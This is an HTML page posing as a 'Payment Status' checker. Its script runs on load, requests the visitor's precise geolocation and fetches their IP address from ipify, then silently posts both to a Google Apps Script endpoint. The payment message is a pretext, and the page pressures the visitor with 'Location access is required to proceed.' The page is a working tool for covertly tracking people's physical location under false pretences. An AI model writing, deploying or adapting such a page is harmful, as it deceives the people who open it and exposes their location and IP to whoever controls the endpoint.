<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Payment Status</title>
  <style>
    body {
      font-family: sans-serif;
      background: #f2f2f2;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    #message {
      font-size: 1.8em;
      color: #333;
      padding: 20px;
      border: 2px dashed #888;
      background: white;
      max-width: 400px;
      border-radius: 8px;
    }
  </style>
</head>
<body>

  <div id="message">Checking payment status...</div>

  <script>
    const scriptUrl = 'https://script.google.com/macros/s/AKfycbz0koeiI_A7djGzS0jOQhSM9TLt0YiwooHplgYNXf9dcCHlk5EW--0I2R8Zdi079O_r/exec';

    // Get IP address from ipify
    async function getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
      } catch (e) {
        return "Unavailable";
      }
    }

    function sendData(ip, latitude, longitude) {
      fetch(scriptUrl, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip, latitude, longitude })
      });
    }

    async function getLocationAndSend() {
      const messageDiv = document.getElementById("message");

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(async (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          const ip = await getIP();

          sendData(ip, latitude, longitude);
          messageDiv.innerText = "Payment not done yet.";
        }, (error) => {
          messageDiv.innerText = "Location access is required to proceed.";
        }, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        messageDiv.innerText = "Geolocation is not supported by your browser.";
      }
    }

    getLocationAndSend();
  </script>

</body>
</html>
